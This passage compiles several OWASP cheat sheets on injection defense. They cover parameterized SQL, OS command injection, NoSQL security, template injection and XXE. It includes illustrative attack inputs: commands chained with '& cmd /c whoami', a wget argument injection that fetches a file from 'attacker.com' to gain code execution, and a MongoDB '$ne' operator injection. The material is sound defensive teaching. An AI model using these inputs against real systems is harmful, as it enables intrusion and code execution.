In addition to being a primary defense when nothing else is possible (e.g., when a bind variable isn't legal), input validation can also be a secondary defense used to detect unauthorized input before it is passed to the SQL query. For more information please see the [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html). Proceed with caution here. Validated data is not necessarily safe to insert into SQL queries via string building.

### Related Articles

See the [Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) for language-specific examples of prepared statements and stored procedures.

## Query Parameterization

> **Source:** [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

[SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) is one of the most dangerous web vulnerabilities. As of the [OWASP Top 10:2025](https://owasp.org/Top10/2025/A05_2025-Injection/), it is categorized under A05:2025-Injection.

It represents a serious threat because SQL Injection allows evil attacker code to change the structure of a web application's SQL statement in a way that can steal data, modify data, or potentially facilitate command injection to the underlying OS.

This cheat sheet is a derivative work of the [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).

### Parameterized Query Examples

SQL Injection is best prevented through the use of [*parameterized queries*](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html). The following chart demonstrates, with real-world code samples, how to build parameterized queries in most of the common web languages. The purpose of these code samples is to demonstrate to the web developer how to avoid SQL Injection when building database queries within a web application.

Please note, many client side frameworks and libraries offer client side query parameterization. These libraries often just build queries with string concatenation before sending raw queries to a server. Please ensure that query parameterization is done server-side!

#### Prepared Statement Examples

##### Using Java built-in feature

```java
String custname = request.getParameter("customerName");
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname);
ResultSet results = pstmt.executeQuery( );
```

##### Using Java with Hibernate

```java
// HQL
@Entity // declare as entity;
@NamedQuery(
 name="findByDescription",
 query="FROM Inventory i WHERE i.productDescription = :productDescription"
)
public class Inventory implements Serializable {
 @Id
 private long id;
 private String productDescription;
}

// Use case
// This should REALLY be validated too
String userSuppliedParameter = request.getParameter("Product-Description");
// Perform input validation to detect attacks
List<Inventory> list =
 session.getNamedQuery("findByDescription")
 .setParameter("productDescription", userSuppliedParameter).list();

// Criteria API
// This should REALLY be validated too
String userSuppliedParameter = request.getParameter("Product-Description");
// Perform input validation to detect attacks
Inventory inv = (Inventory) session.createCriteria(Inventory.class).add
(Restrictions.eq("productDescription", userSuppliedParameter)).uniqueResult();
```

##### Using .NET built-in feature

```csharp
String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
   OleDbCommand command = new OleDbCommand(query, connection);
   command.Parameters.Add(new OleDbParameter("customerName", CustomerName.Text));
   OleDbDataReader reader = command.ExecuteReader();
   // …
} catch (OleDbException se) {
   // error handling
}
```

##### Using ASP .NET built-in feature

```csharp
string sql = "SELECT * FROM Customers WHERE CustomerId = @CustomerId";
SqlCommand command = new SqlCommand(sql);
command.Parameters.Add(new SqlParameter("@CustomerId", System.Data.SqlDbType.Int));
command.Parameters["@CustomerId"].Value = 1;
```

##### Using Ruby with ActiveRecord

```ruby
## Create
Project.create!(:name => 'owasp')
## Read
Project.all(:conditions => "name = ?", name)
Project.all(:conditions => { :name => name })
Project.where("name = :name", :name => name)
## Update
project.update_attributes(:name => 'owasp')
## Delete
Project.delete(:name => 'name')
```

##### Using Ruby built-in feature

```ruby
insert_new_user = db.prepare "INSERT INTO users (name, age, gender) VALUES (?, ? ,?)"
insert_new_user.execute 'aizatto', '20', 'male'
```

##### Using PHP with PHP Data Objects

```php
$stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
$stmt->bindParam(':name', $name);
$stmt->bindParam(':value', $value);
```

##### Using Cold Fusion built-in feature

```coldfusion
<cfquery name = "getFirst" dataSource = "cfsnippets">
    SELECT * FROM #strDatabasePrefix#_courses WHERE intCourseID =
    <cfqueryparam value = #intCourseID# CFSQLType = "CF_SQL_INTEGER">
</cfquery>
```

##### Using PERL with Database Independent Interface

```perl
my $sql = "INSERT INTO foo (bar, baz) VALUES ( ?, ? )";
my $sth = $dbh->prepare( $sql );
$sth->execute( $bar, $baz );
```

##### Using Rust with SQLx
<!-- contributed by GeekMasher -->

```rust
// Input from CLI args but could be anything
let username = std::env::args().last().unwrap();

// Using build-in macros (compile time checks)
let users = sqlx::query_as!(
        User,
        "SELECT * FROM users WHERE name = ?",
        username
    )
    .fetch_all(&pool)
    .await
    .unwrap();

// Using built-in functions
let users: Vec<User> = sqlx::query_as::<_, User>(
        "SELECT * FROM users WHERE name = ?"
    )
    .bind(&username)
    .fetch_all(&pool)
    .await
    .unwrap();
```

#### Stored Procedure Examples

The SQL you write in your web application isn't the only place that SQL injection vulnerabilities can be introduced. If you are using Stored Procedures, and you are dynamically constructing SQL inside them, you can also introduce SQL injection vulnerabilities.

Dynamic SQL can be parameterized using bind variables, to ensure the dynamically constructed SQL is secure.

Here are some examples of using bind variables in stored procedures in different databases.

##### Oracle using PL/SQL

###### Normal Stored Procedure

No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required:

```sql
PROCEDURE SafeGetBalanceQuery(UserID varchar, Dept varchar) AS BEGIN
   SELECT balance FROM accounts_table WHERE user_ID = UserID AND department = Dept;
END;
```

###### Stored Procedure Using Bind Variables in SQL Run with EXECUTE

Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code:

```sql
PROCEDURE AnotherSafeGetBalanceQuery(UserID varchar, Dept varchar)
          AS stmt VARCHAR(400); result NUMBER;
BEGIN
   stmt := 'SELECT balance FROM accounts_table WHERE user_ID = :1
            AND department = :2';
   EXECUTE IMMEDIATE stmt INTO result USING UserID, Dept;
   RETURN result;
END;
```

##### SQL Server using Transact-SQL

###### Normal Stored Procedure

No dynamic SQL being created. Parameters passed in to stored procedures are naturally bound to their location within the query without anything special being required:

```sql
PROCEDURE SafeGetBalanceQuery(@UserID varchar(20), @Dept varchar(10)) AS BEGIN
   SELECT balance FROM accounts_table WHERE user_ID = @UserID AND department = @Dept
END
```

###### Stored Procedure Using Bind Variables in SQL Run with EXEC

Bind variables are used to tell the database that the inputs to this dynamic SQL are 'data' and not possibly code:

```sql
PROCEDURE SafeGetBalanceQuery(@UserID varchar(20), @Dept varchar(10)) AS BEGIN
   DECLARE @sql VARCHAR(200)
   SELECT @sql = 'SELECT balance FROM accounts_table WHERE '
                 + 'user_ID = @UID AND department = @DPT'
   EXEC sp_executesql @sql,
                      '@UID VARCHAR(20), @DPT VARCHAR(10)',
                      @UID=@UserID, @DPT=@Dept
END
```

## OS Command Injection Defense

> **Source:** [OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.

For example, if the supplied value is:

``` shell
calc
```

when typed in a Windows command prompt, the application *Calculator* is displayed.

However, if the supplied value has been tampered with, and now it is:

``` shell
calc & echo "test"
```

when executed, it changes the meaning of the initial intended value.

Now, both the *Calculator* application and the value *test* are displayed:

![CommandInjection](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.

#### Argument Injection

Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.

For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.

```php

system("curl " . escape($url));
```

which will prevent an attacker to run other commands.

However, if the attacker controlled string contains an additional argument of the `curl` command:

```php

system("curl " . escape("--help"))
```

Now when the above code is executed, it will show the output of `curl --help`.

Depending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.

### Primary Defenses

#### Defense Option 1: Avoid calling OS commands directly

The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.

For example use `mkdir()` instead of `system("mkdir /dir_name")`.

If there are available libraries or APIs for the language you use, this is the preferred method.

#### Defense option 2: Escape values added to OS commands specific to each OS

For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.

The `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo "hello"`, the final output will be like `calc '& echo "hello"'` which will be parsed as a single argument to the command `calc`.

Even though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.

#### Defense option 3: Parameterization in conjunction with Input Validation

If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:

##### Layer 1

**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.

##### Layer 2

**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:

- When it comes to the **commands** used, these must be validated against a list of allowed commands.
- In regards to the **arguments** used for these commands, they should be validated using the following options:
    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
- For commands that support it, use `--` to end option parsing. In [curl](https://curl.se/docs/manpage.html#OPTIONS), later arguments are still URL operands: `--` does not prevent additional transfers. Pass exactly one validated URL as one argument using a process API, and disable curl's [URL globbing](https://curl.se/docs/manpage.html#GLOBBING) with `--globoff`. Do not interpolate an unquoted value into a shell command. Argument separation does not validate the destination; apply [SSRF protections](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```

### Additional Defenses

On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.

These additional defenses are:

- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
- If possible, create isolated accounts with limited privileges that are only used for a single task.

### Code examples

#### Java

In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.

*Note about the Java's `Runtime.exec` method behavior:*

There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.

However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.

**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.

The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.

*Code to test the note above:*

``` java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```

*Result of the test:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```

*Incorrect usage:*

```java
ProcessBuilder b = new ProcessBuilder("C:\\DoStuff.exe -arg1 -arg2");
```

This creates a builder with one command-list element, not a program followed by two arguments. [`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list. The snippet does not start a process or demonstrate shell-command injection.

*Correct Usage:*

This illustrative example starts a process with a modified working directory and passes the executable and each argument separately. Keep the executable and working directory trusted, and validate any untrusted arguments for the invoked program. Argument separation does not replace [argument validation](#layer-2).

``` java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```

#### .Net

See relevant details in the [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection)

#### PHP

PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.

`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.

`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.

It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.

For example, consider this code using `wget` with `escapeshellcmd()`:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```

If the user provides:

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```

`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.

The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```

Now the malicious input becomes:

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.

In addition, it is good security practice to follow these recommendations:

- **Hardcode the command**: never allow the user to choose which executable to run.
- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.
- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.

## NoSQL Security

> **Source:** [NoSQL Security](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

NoSQL databases (MongoDB, CouchDB, Cassandra etc.) power many modern applications with flexible schemas and horizontal scale.
This cheat sheet summarizes guidance to reduce risk when using NoSQL systems.

### Threats & Common Failure Modes

- **NoSQL Injection** — Unsafe construction of query objects or query strings from untrusted input.
- **Exposed Management Interfaces** — Admin GUIs, database ports or REST endpoints exposed to the internet.
- **Weak/No Authentication & Authorization** — Default open access or excessive privileges for clients.
- **Insecure Network Exposure** — No TLS, open ports, insufficient network segmentation.
- **Insecure Defaults** — Default admin accounts, default passwords, unsecured configs.
- **Poor Access Control Models** — Coarse roles allowing lateral abuse.
- **Insecure Serialization / Deserialization** — Remote code execution via unsafe object deserialization.
- **Misconfigured CORS / Public APIs** — APIs accidentally allow cross-origin requests or wide access.
- **Credential & Secret Leaks** — Hardcoded DB credentials in code, images, CI logs.
- **Unsafe Backup Exposure** — Backups left unencrypted or publicly accessible.
- **Supply-chain / Dependency Risks** — Vulnerable drivers, ORMs/ODMs, or plugins.

### Secure-by-Design Principles

- **Treat all input as untrusted** — validate, sanitize, and normalize.
- **Use least privilege** — narrow roles for users, services, and operators.
- **Defense in depth** — combine network controls, auth, input validation, and monitoring.
- **Secure defaults** — change default ports/accounts, enable auth and TLS by default.
- **Automate secrets & rotation** — vaults and short-lived credentials.
- **Monitor & audit** — log access and detect anomalies.

### Practical Defenses & Examples

#### Prevent NoSQL Injection

**Unsafe (string-based filter building — Node.js / MongoDB):**

```js
// DANGEROUS: building query from untrusted input
const q = "{ name: '" + req.query.name + "' }";
const filter = eval("(" + q + ")"); // NEVER do this
db.collection('users').find(filter)
```

**Safe (use driver query objects / parameterization):**

Building a query object does not prevent operator injection when an untrusted value is itself an object. For example, MongoDB interprets `{ name: { $ne: "" } }` as a [not-equal query](https://www.mongodb.com/docs/manual/reference/operator/query/ne/). Validate the expected scalar type before constructing the filter; do not pass client-supplied objects through as field values.

```js
const name = req.query.name;
if (typeof name !== 'string') throw new Error("Invalid name");
const filter = { name };
db.collection('users').find(filter)
```

**Additional pattern rejection:**

```js
// Reject a pattern in the serialized request body.
if (JSON.stringify(req.body).includes('"$')) throw Error("Invalid input");
```

This [`JSON.stringify()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify#description) check is a denylist, not an operator allowlist. It also rejects ordinary string values that begin with `$`, and it does not validate allowed fields or their types. Use [field-specific validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#input-validation-strategies) before building queries.

Notes:

- Do **not** accept raw JSON fragments from the client to execute as queries.
- Disallow client-controlled query operators (like `$where`, `$regex`, or `$expr`) unless strictly required and validated.
- For text-based search parameters, use safe driver APIs (e.g., `$text` with controlled input).

#### Use Secure Driver / ODM Patterns

- Prefer high-level APIs (ODM/ORM) that build queries safely (e.g., Mongoose, Spring Data, Datastax driver patterns).
- Avoid `.eval()`-like functionality and raw query execution from untrusted data.
- Sanitize and validate any raw expressions before passing to the DB.

##### Example — PyMongo safe usage

```python
from pymongo import MongoClient
client = MongoClient(uri, tls=True)
collection = client.mydb.users
if not isinstance(email_input, str):
    raise ValueError("Invalid email")
user = collection.find_one({"email": email_input})
```

#### Authentication & Authorization

- **Enable authentication** (do not run databases unauthenticated).
- Use **role-based access control (RBAC)**, least privilege for service accounts.
- Use **separate users** for admin/backup/readonly/application.
- Use identity federation or short-lived credentials when supported (e.g., AWS IAM -> DynamoDB).

For more information please check following cheat sheets:

[Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

[Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

#### Network & Transport Security

- **Bind services to internal interfaces**, not `0.0.0.0`.
- Use **network segmentation / private subnets** and security groups.
- **Enforce TLS** (in transit encryption) for driver connections and admin consoles.
- Turn off remote management or restrict it to admin networks/VPNs.

#### Configuration Hardening

- Change default ports and disable sample/demo users.
- Turn off or restrict features that execute code on the server, such as [MongoDB server-side JavaScript](https://www.mongodb.com/docs/drivers/client-libraries-best-practices/#restrict-server-side-javascript-execution).
- Require TLS for internal replication links where supported.

#### Secrets Management

- Do **not** hardcode DB credentials — use a secret manager (Vault, AWS Secrets Manager, Azure Key Vault).
- Avoid baking credentials into container images or environment variables in CI logs.
- Rotate credentials regularly and use ephemeral tokens when possible.

#### Logging, Monitoring & Auditing

- Enable audit logging (connection attempts, admin actions, failed auth).
- Send logs to a tamper-evident SIEM.
- Alert on anomalous patterns (spike in queries, slow queries, large data exports).
- Monitor for suspicious commands (e.g., admin actions, `$where`, map-reduce jobs).

#### Backups & Snapshots

- Encrypt backups at rest and during transfer.
- Restrict access to backup storage.
- Sanitize backups for PII as required by policy.
- Validate restore procedures regularly.

### Quick NoSQL Security Checklist

- Enable authentication & RBAC
- Enforce TLS for client and node communication
- Bind DB to internal IPs / use private networks
- Use least privilege service accounts
- Disallow client-controlled query operators unless validated
- Avoid raw query execution / eval on server
- Store credentials in secret manager & rotate them
- Harden configs (disable unsafe defaults)
- Encrypt and secure backups
- Monitor/audit DB access and admin actions
- Keep DB and drivers patched

### Do’s and Don’ts

**Do**:

- Use driver query objects rather than building query strings.
- Validate and whitelist user-supplied fields (columns/keys).
- Restrict management interfaces and require MFA for admin access.
- Automate security testing in CI/CD pipelines.

**Don’t**:

- Expose DB ports/admin consoles to the public Internet.
- Accept raw JSON queries from clients or eval untrusted strings.
- Use root/admin DB accounts for application connections.
- Rely only on network controls to protect badly written queries.

### Examples of Dangerous Patterns (brief)

- Accepting client-controlled `$where` expressions executes untrusted JavaScript inside MongoDB and can consume excessive resources. Use standard query operators instead, and [disable server-side scripting](https://www.mongodb.com/docs/drivers/client-libraries-best-practices/#restrict-server-side-javascript-execution) when it is not needed.
- Concatenating user input into query language strings or shell commands for DB tools.
- Leaving MongoDB unsecured (no auth) listening on public IP.

## Server-Side Template Injection Prevention

> **Source:** [Server-Side Template Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Server-Side Template Injection (SSTI) happens when a server-side template engine evaluates untrusted input as template code instead of rendering it as data (Common Weakness Enumeration [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)). Engines such as Jinja2, Twig, and FreeMarker have their own expression languages, so injected syntax runs with the engine's access to application objects. Depending on the engine and its configuration, the impact ranges from reading sensitive data and files to remote code execution.

Untrusted input crosses into template code in three ways:

- **Input becomes template source.** Untrusted data, such as request parameters, stored user content, or third-party files, is concatenated into a template string, even inside an expression like `"Hello {{" + name + "}}"`, or passed to a string-to-template API such as Jinja2's `from_string()` or Flask's `render_template_string()`.
- **A template evaluates input as code.** A fixed template passes a value to a feature that parses strings as template code, such as FreeMarker's `?interpret` and `?eval` built-ins or Twig's `template_from_string()` function.
- **Input chooses the template.** User input selects a template name, path, or include target, which can make the engine load files it should not.

Do not try to filter template syntax out of input. Syntax differs between engines and contexts, so a denylist will miss payloads.

This cheat sheet covers prevention. To test a running application, use the [OWASP Web Security Testing Guide (WSTG-INJT-18)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/18-Server-side_Template_Injection/).

### Prevention

#### Treat templates as code

Keep templates with the application source, review changes to them like code, and never build them from untrusted data. Do not let untrusted data choose a template name, path, or include target either: map the user's choice to a fixed list of template names on the server. If users must author templates, follow the User-Supplied Templates section below.

#### Pass untrusted input only as data

Render a fixed template and pass user values as named variables, the same way a parameterized query keeps data out of SQL.

#### Keep the render context minimal

A template can read everything in its render context and, depending on the engine, call methods on the objects you pass. Pass only the values a template needs. Do not pass secrets, configuration, service clients, or objects whose methods have side effects. This limits what an injected template can reach, but it does not stop code execution in an engine that is not sandboxed.

#### Prefer the least powerful engine

Choose an engine that [limits the power of its expressions, function calls, or commands](https://cwe.mitre.org/data/definitions/1336.html#Potential_Mitigations), such as a logic-less engine like Mustache, unless you need more. Custom helpers and lambdas you register still run as application code.

#### Keep output escaping on

Auto-escaping helps prevent [cross-site scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) in HTML output. It does not prevent SSTI, because escaping applies to the values a template prints, not to template code the engine has already parsed. Keep it enabled and never mark untrusted values as safe.

#### Find vulnerable template code

- Inventory every place the application renders templates, including email and notification bodies, PDF and report generation, prompts for large language models, and every feature that lets users create or edit templates. Treat templates that ship in third-party files as templates you did not write.
- Search for string-to-template APIs and features, such as Jinja2's `from_string()`, Flask's `render_template_string()`, Twig's `createTemplate()` and `template_from_string()`, and FreeMarker's `Template` constructor and `?interpret` and `?eval` built-ins. Also search for code that builds template source or template names from input.
- For each call site, confirm that untrusted data reaches only render variables and that no template passes it to a feature that evaluates strings as code.

### Engine Configuration

Frameworks can change engine defaults, so check the effective settings in your application. For other engines, consult their documentation for restrictions on untrusted templates.

| Engine | Restrictions for untrusted templates |
| --- | --- |
| Jinja2 | Use [`SandboxedEnvironment`](https://jinja.palletsprojects.com/en/stable/sandbox/), or `ImmutableSandboxedEnvironment` to also block changes to lists, sets, and dictionaries. Restrict attributes further by overriding `is_safe_attribute()`, and decorate dangerous methods with `unsafe()`. |
| Twig | Twig treats templates as trusted code, so its [sandbox](https://twig.symfony.com/doc/3.x/sandbox.html) is the only boundary for untrusted authors. Give the sandbox its own environment and a strict `SecurityPolicy` that allowlists the tags, filters, functions, tests, methods, and properties templates may use. The `Sandbox` class requires Twig 3.29 or later. Never allow [`template_from_string()`](https://twig.symfony.com/doc/3.x/functions/template_from_string.html) in sandboxed templates. |
| FreeMarker | Follow the [FAQ on uploaded templates](https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security): set the `?new` class resolver to `ALLOWS_NOTHING_RESOLVER`, not `SAFER_RESOLVER`; keep `?api` disabled (the default), restrict member access with `SimpleObjectWrapper` or a `WhitelistMemberAccessPolicy`, disable DOM node wrapping, and use a template loader that only loads approved files. |

### User-Supplied Templates

Some products let users write templates by design, such as email builders, content management system themes, and report designers. Treat this as a privileged feature that runs user-written code:

- Limit template editing to authorized roles and log template changes for audit.
- Render with the engine's sandbox or restricted configuration from the table above and keep the engine up to date.
- Register only filters, functions, and globals that are safe to call with any arguments a template author chooses. The sandbox does not limit what your own code does once it is called.
- Contain what the sandbox does not. As [Twig's documentation explains](https://twig.symfony.com/doc/3.x/sandbox.html#what-the-sandbox-does-not-protect-against), a sandbox does not limit CPU or memory use or make the rendered output safe, and Jinja2 and FreeMarker give the same warning about resources. Treat the output as untrusted, and render in an isolated process or container with time and memory limits, no secrets, and restricted network access.

## XML External Entity Prevention

> **Source:** [XML External Entity Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

XML External Entity (XXE) injection occurs when an XML processor resolves an external entity from untrusted input. This can expose local files, cause server-side request forgery (SSRF), or exhaust resources. [CWE-611](https://cwe.mitre.org/data/definitions/611.html) describes the weakness; this cheat sheet gives parser-specific controls to prevent it.

### General Guidance

**Disable document type definitions (DTDs) whenever possible.** Reject DOCTYPE declarations if the parser supports it. If your application needs DTDs, disable external entity resolution and external DTD loading, and limit entity expansion.

- Keep XInclude disabled unless explicitly required; it can load resources independently of DTDs.
- Restrict external access during schema validation and style sheet processing as well as XML parsing.
- Treat an unsupported security setting as a configuration failure. Do not continue processing untrusted XML with partial hardening.

Controls and defaults vary by parser; see the language-specific guidance below and, for Java, the [JAXP Security Guide](https://docs.oracle.com/en/java/javase/25/security/java-api-xml-processing-jaxp-security-guide.html). Preventing XXE does not prevent every XML denial-of-service attack. See the [XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html#xml-entity-expansion) for entity expansion and other XML resource risks.

### C/C++

#### libxml2

The Enum [xmlParserOption](https://gnome.pages.gitlab.gnome.org/libxml2/html/parser_8h.html) should not have the following options defined:

- `XML_PARSE_NOENT`: Expands entities and substitutes them with replacement text
- `XML_PARSE_DTDLOAD`: Load the external DTD

Note:

Per: According to [this post](https://mail.gnome.org/archives/xml/2012-October/msg00045.html), starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following [patch](https://gitlab.gnome.org/GNOME/libxml2/commit/4629ee02ac649c27f9c0cf98ba017c6b5526070f).

Search whether the following APIs are being used and make sure there is no `XML_PARSE_NOENT` and `XML_PARSE_DTDLOAD` defined in the parameters:

- `xmlCtxtReadDoc`
- `xmlCtxtReadFd`
- `xmlCtxtReadFile`
- `xmlCtxtReadIO`
- `xmlCtxtReadMemory`
- `xmlCtxtUseOptions`
- `xmlParseInNodeContext`
- `xmlReadDoc`
- `xmlReadFd`
- `xmlReadFile`
- `xmlReadIO`
- `xmlReadMemory`

#### libxerces-c

Use of `XercesDOMParser` do this to prevent XXE:

``` cpp
XercesDOMParser *parser = new XercesDOMParser;
parser->setCreateEntityReferenceNodes(true);
parser->setDisableDefaultEntityResolution(true);
```

Use of SAXParser, do this to prevent XXE:

``` cpp
SAXParser* parser = new SAXParser;
parser->setDisableDefaultEntityResolution(true);
```

For `SAX2XMLReader`, configure the reader that will parse the document. The [Xerces-C++ feature documentation](https://xerces.apache.org/xerces-c/program-sax2-3.html) describes `fgXercesDisableDefaultEntityResolution`: it prevents fallback resolution when `resolveEntity` returns `NULL`. A custom resolver must also reject unapproved resources.

``` cpp
SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
reader->setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);
```

### ColdFusion

Per [this blog post](https://www.hoyahaxa.com/2022/11/on-coldfusion-xxe-and-other-xml-attacks.html), both Adobe ColdFusion and Lucee have built-in mechanisms to disable support for external XML entities.

#### Adobe ColdFusion

As of ColdFusion 2018 Update 14 and ColdFusion 2021 Update 4, all native ColdFusion functions that process XML have a XML parser argument that disables support for external XML entities. Since there is no global setting that disables external entities, developers must ensure that every XML function call uses the correct security options.

From the [documentation for the XmlParse() function](https://guides.adobe.com/coldfusion/en/docs/cfml-reference/xmlparse.html), you can disable XXE with the code below:

```
<cfset parseroptions = structnew()>
